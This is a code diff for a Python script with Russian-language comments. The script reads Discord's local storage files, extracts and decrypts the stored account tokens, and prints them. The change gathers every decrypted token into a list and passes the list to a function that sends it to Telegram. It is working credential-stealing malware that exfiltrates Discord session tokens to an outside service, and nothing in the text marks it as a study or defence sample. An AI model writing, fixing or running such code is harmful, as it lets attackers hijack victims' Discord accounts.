@@ -26,6 +26,8 @@ def decrypt_token(buff, master_key):
 master_key = get_master_key()
 path = os.getenv('APPDATA') + r'\discord\Local Storage\leveldb'
 
+tokens =[]
+
 for file_name in os.listdir(path):
     if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
         continue
@@ -34,6 +36,7 @@ for file_name in os.listdir(path):
             for token in re.findall(r'dQw4w9WgXcQ:[^.*\x22]*', line):
                 token = token.split('dQw4w9WgXcQ:')[1]
                 decrypted_token = decrypt_token(base64.b64decode(token), master_key)
+                tokens.append(decrypted_token)
                 print(f"Ваш токен: {decrypted_token}")
 
 def send_to_telegram(token_discord):
@@ -56,6 +59,4 @@ def send_to_telegram(token_discord):
         print(f"Ошибка сети: {e}")
 
 # ВЫЗОВ ФУНКЦИИ (без этой строки ничего не произойдет!)
-
-send_to_telegram(decrypted_token)
-
+send_to_telegram(tokens)
